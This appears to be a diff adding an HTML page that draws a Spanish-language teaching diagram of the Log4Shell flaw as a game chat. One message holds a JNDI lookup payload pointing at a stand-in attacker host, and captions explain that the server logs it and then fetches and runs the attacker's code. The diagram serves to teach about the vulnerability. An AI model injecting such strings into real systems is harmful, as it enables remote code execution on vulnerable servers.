@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="output" content="assets/visuals/diagram_log4shell_chat.png" data-width="1200" data-height="900">
+<link rel="stylesheet" href="style.css">
+<style>
+  /* Patron publico de CVE-2021-44228 (JNDI lookup en un mensaje que se registra). Dominio de ejemplo. */
+  .chat { flex: 1; display: flex; flex-direction: column; justify-content: center; gap: 26px; margin-top: 24px; }
+  .msg { align-self: flex-start; max-width: 92%; border-radius: 28px 28px 28px 6px; padding: 22px 30px; font-size: 32px; background: #33396b; }
+  .msg .who { font-size: 22px; color: var(--muted); margin-bottom: 6px; }
+  .evil { background: #2a0f12; border: 4px solid #e5322d; font-family: Consolas, "Courier New", monospace; font-size: 36px; color: #ff9b97; }
+  .arrow { text-align: center; font-size: 34px; color: var(--gold); }
+  .log { align-self: center; border-radius: 18px; padding: 18px 28px; background: #10132a; font-family: Consolas, "Courier New", monospace; font-size: 26px; color: #b9bfe6; }
+  .log b { color: #e5322d; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="title">Un mensaje "normal" en el chat</div>
+    <div class="chat">
+      <div class="msg"><div class="who">Steve_2009</div>gg, buena partida</div>
+      <div class="msg evil"><div class="who" style="color:#ff9b97">hacker_123</div>${jndi:ldap://atacante.example/x}</div>
+      <div class="arrow">⬇ el servidor lo guarda en el log... y lo obedece</div>
+      <div class="log">log4j › lookup › <b>descarga y ejecuta código del atacante</b></div>
+    </div>
+  </div>
+</body>
+</html>
